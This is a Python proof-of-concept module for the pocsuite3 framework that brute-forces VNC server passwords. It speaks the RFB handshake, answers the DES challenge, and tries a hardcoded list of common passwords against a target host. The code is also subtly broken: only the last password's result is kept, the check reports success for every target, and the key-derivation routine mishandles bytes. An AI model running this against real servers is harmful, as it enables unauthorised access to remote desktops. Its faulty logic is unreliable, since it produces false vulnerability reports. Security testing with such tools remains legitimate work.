#!/usr/bin/env python
#coding=utf-8

import traceback
import socket
from time import time,sleep
# 用于VNC认证爆破，参考：https://github.com/c0ny1/pwcracker/blob/master/plus/vnc.py
from Crypto.Cipher import DES

# 将输入的url转换为ip:port，供socket使用
from pocsuite3.lib.utils import url2ip

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY


'''
基于socket的未授权访问参考：https://github.com/knownsec/pocsuite3/blob/0f68c1cef3804c5d43be6cfd11c2298f3d77f0ad/pocsuite3/pocs/redis_unauthorized_access.py
'''
class VNC_POC(POCBase):
    vulID = 'VNC-unauthorized-access'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    appName = 'VNC'
    appVersion = ''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = "INFORMATION_DISCLOSURE"

    vulDate = '2020-04-14'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-04-14'  # 编写 PoC 的日期
    updateDate = '2020-04-14'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mntn0x.github.io/2019/08/02/RealVNC%E6%BC%8F%E6%B4%9E/']  # 漏洞地址来源,0day不用写
    name = 'VNC未授权访问漏洞'  # PoC 名称
    cvss = u"高危"

    
    def _verify(self):
        result={}

        vul_url = self.url
        target_url = vul_url

        # 传入True参数，得到host和port，参考：https://github.com/knownsec/pocsuite3/blob/0f68c1cef3804c5d43be6cfd11c2298f3d77f0ad/pocsuite3/lib/utils/__init__.py
        host, port = url2ip(target_url, True)  

        
        
        try:
            '''
            socket.setdefaulttimeout(5)   # 默认timeout时间
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            server.connect((host, port))

            hello = server.recv(12)

            print("[*] Hello From Server: {0}".format(hello))

            # 如果响应内容中有"RFB", 比如"RFB 003.008"（版本号），则认为是VNC服务
            
            if "RFB 003.008" in str(hello):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target_url
                return self.save_output(result)
            '''

            if self.crack(host, port):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target_url
                return self.save_output(result)

            return self.save_output(result)
        except socket.error as msg:
            print('[*] Could not connect to the target VNC service. Error code: ' + str(msg[0]) + ' , Error message : ' + msg[1])
            traceback.print_stack(msg)


    #漏洞攻击
    def _attack(self):
        return self._verify()


    def crack(self, host, port):
        passwords = ['123456', 'admin', 'root', 'password', '123123', '123', '1', '',
                    'P@ssw0rd!!', 'qwa123', '12345678', 'test', '123qwe!@#',
                    '123456789', '123321', '1314520', '666666', 'woaini', 'fuckyou', '000000',
                    '1234567890', '8888888', 'qwerty', '1qaz2wsx', 'abc123', 'abc123456',
                    '1q2w3e4r', '123qwe', '159357', 'p@ssw0rd', 'p@55w0rd', 'password!',
                    'p@ssw0rd!', 'password1', 'r00t', 'system', '111111', 'admin']

        vnc = VNC()
        timeout='5'

        try:
            with Timing() as timing:
                # VNC握手
                code, mesg = 0, vnc.connect(host, int(port or 5901), int(timeout))

            with Timing() as timing:
                # VNC认证
                for password in passwords:
                    code, mesg = vnc.login(password.encode())    # str -> byte

        except Exception as e:
            print(e)
            traceback.print_stack()
    
        if code == 0:    # 返回00 00 00 00，代表认证成功
            return True, u'Crack success!'
        elif code == 1:  # 返回00 00 00 01，代表认证失败
            return False, u'Crack fail!'
        else:
            return False, u'Crack fail!'


    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


# 自定义类
class Timing:
    def __enter__(self):
        self.t1 = time()
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        self.time = time() - self.t1


# 自定义类
class VNC:

    # VNC握手
    def connect(self, host, port, timeout):
        self.fp = socket.create_connection((host, port), timeout=timeout)
        resp = self.fp.recv(99) # banner

        # 参考：https://help.realvnc.com/hc/en-us/articles/360003563111-Too-many-security-failures#what-causes-this-message--0-0
        if 'Too many security failures' in resp.decode():
            raise Exception('IP blocked after five unsuccessful connection attempts!')
        
        print('banner: {0}'.format(resp))
        self.version = resp[:11]

        if len(resp) > 12:
            raise Exception('%s %r' % (self.version, resp[12:]))

        return self.version


    # VNC认证
    def login(self, password):
        #print 'Remote version: %r' % self.version
        major, minor = self.version[6], self.version[10]

        if (major, minor) in [('3', '8'), ('4', '1')]:
            proto = 'RFB 003.008\n'

        elif (major, minor) == ('3', '7'):
            proto = 'RFB 003.007\n'

        else:
            proto = 'RFB 003.003\n'

        print('Client version: {0}'.format(proto[:-1]))
        type(proto)
        type(proto.encode())
        self.fp.sendall(proto.encode())

        sleep(0.5)

        resp = self.fp.recv(99)
        print('Security types supported: {0}'.format(resp))

        if major == '4' or (major == '3' and int(minor) >= 7):
            code = ord(resp[0:1].decode())
            if code == 0:
                raise Exception('Session setup failed: %s' % B(resp))

            self.fp.sendall(b'\x02') # always use classic VNC authentication
            resp = self.fp.recv(99)

        else: # minor == '3':
            code = ord(resp[3:4].decode())
            if code != 2:
                raise Exception('Session setup failed: %s' % resp)

        resp = resp[-16:]

        if len(resp) != 16:
            raise Exception('Unexpected challenge size (No authentication required? Unsupported authentication type?)')


        print('Challenge: {0}'.format(resp))
        print(password.ljust(8, '0'))
        pw = password.ljust(8, '0')[:8] # make sure it is 8 chars long, zero padded
        key = self.gen_key(pw)

    
        des = DES.new(key, DES.MODE_ECB)
        enc = des.encrypt(resp)
    
        #print 'enc: %r' % enc
        self.fp.sendall(enc)
    
        resp = self.fp.recv(99)
        #print 'resp: %r' % resp
    
        code = ord(resp[3:4].decode())
        mesg = resp[8:]
    
        if code == 1:
            return code, mesg or 'Authentication failure'
    
        elif code == 0:
            return code, mesg or 'OK'
    
        else:
            raise Exception('Unknown response: %r (code: %s)' % (resp, code))


    def gen_key(self, key):
        newkey = []
        for ki in range(len(key)):
            print(key[ki])
            print(str(key[ki]))
            bsrc = ord(str(key[ki]))
            btgt = 0
            for i in range(8):
                if bsrc & (1 << i):
                    btgt = btgt | (1 << 7-i)
            newkey.append(btgt)

        return ''.join(chr(c) for c in newkey)


register_poc(VNC_POC)
